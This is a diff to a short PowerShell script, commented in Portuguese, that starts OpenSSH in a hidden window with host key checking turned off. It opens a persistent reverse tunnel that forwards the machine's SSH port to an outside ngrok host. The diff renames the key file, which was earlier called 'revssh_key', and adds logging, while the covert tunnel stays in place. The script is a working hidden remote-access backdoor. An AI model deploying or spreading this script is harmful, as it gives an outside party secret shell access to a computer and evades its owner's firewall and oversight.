@@ -2,17 +2,27 @@
 $sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
 
 # Caminho da chave privada
-$keyPath = "C:\Users\Testes\.ssh\revssh_key"
+$keyPath = "C:\Users\Teste\.ssh\ssh_key"
 
-# Executa SSH em segundo plano invisível
-Start-Process -FilePath $sshPath -ArgumentList `
-    "-i", "$keyPath", `
-    "-o", "StrictHostKeyChecking=no", `
-    "-o", "ServerAliveInterval=60", `
-    "-o", "ServerAliveCountMax=3", `
-    "-o", "ExitOnForwardFailure=yes", `
-    "-R", "2222:localhost:22", `
-    "u0_a416@0.tcp.sa.ngrok.io", `
-    "-p", "10218", `
-    "-N" `
-    -WindowStyle Hidden
+# Arquivo de log único
+$logFile = "C:\Users\Teste\.ssh\ssh.log"
+
+# Argumentos do SSH
+$sshArgs = @(
+    "-i", "$keyPath",
+    "-o", "StrictHostKeyChecking=no",
+    "-o", "ServerAliveInterval=60",
+    "-o", "ServerAliveCountMax=3",
+    "-o", "ExitOnForwardFailure=yes",
+    "-R", "2222:localhost:22",
+    "u0_a416@0.tcp.sa.ngrok.io",
+    "-p", "10218",
+    "-N"
+)
+
+# Executa SSH em segundo plano com log único
+Start-Process -FilePath $sshPath `
+              -ArgumentList $sshArgs `
+              -RedirectStandardOutput $logFile `
+              -RedirectStandardError $logFile `
+              -WindowStyle Hidden
